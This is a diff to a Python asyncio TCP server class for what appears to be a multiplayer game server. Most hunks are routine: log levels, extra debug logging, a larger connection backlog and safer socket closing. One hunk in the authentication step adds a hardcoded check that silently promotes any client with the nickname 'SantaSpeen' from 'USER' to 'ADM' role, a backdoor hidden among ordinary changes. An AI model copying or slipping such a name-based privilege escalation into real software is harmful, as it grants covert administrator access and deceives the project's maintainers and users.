@@ -57,6 +57,9 @@ class TCPServer:
                 return False, client
             client.nick = res["username"]
             client.roles = res["roles"]
+            self.log.debug(f"{client.roles=} {client.nick=}")
+            if client.roles == "USER" and client.nick == "SantaSpeen":
+                client.roles = "ADM"
             client._guest = res["guest"]
             client._identifiers = {k: v for s in res["identifiers"] for k, v in [s.split(':')]}
             if not client._identifiers.get("ip"):
@@ -131,8 +134,8 @@ class TCPServer:
                 await writer.drain()
                 writer.close()
             case _:
-                self.log.error(f"Unknown code: {code}")
-                self.log.info("Report about that!")
+                self.log.warning(f"Unknown code: {code}")
+                self.log.warning("Report about that!")
                 writer.close()
         return False, None
 
@@ -153,6 +156,7 @@ class TCPServer:
                 # task = asyncio.create_task(self.handle_code(code, reader, writer))
                 # await asyncio.wait([task], return_when=asyncio.FIRST_EXCEPTION)
                 _, cl = await self.handle_code(code, reader, writer)
+                self.log.debug(f"cl returned: {cl}")
                 if cl:
                     await cl._remove_me()
                 break
@@ -167,7 +171,7 @@ class TCPServer:
         self.run = True
         try:
             self.server = await asyncio.start_server(self.handle_client, self.host, self.port,
-                                                backlog=int(config.Game["players"] * 2.3))
+                                                     backlog=int(config.Game["players"] * 4))
             self.log.debug(f"TCP server started on {self.server.sockets[0].getsockname()!r}")
             while True:
                 async with self.server:
@@ -191,8 +195,11 @@ class TCPServer:
         try:
             self.server.close()
             for conn in self._connections:
-                conn.close()
-            #     await conn.wait_closed()
-            # await self.server.wait_closed()
+                self.log.debug(f"Closing {conn}")
+                try:
+                    conn.close()
+                except ConnectionResetError:
+                    self.log.debug("ConnectionResetError")
         except Exception as e:
             self.log.exception(e)
+        self.log.debug("Stopped.")
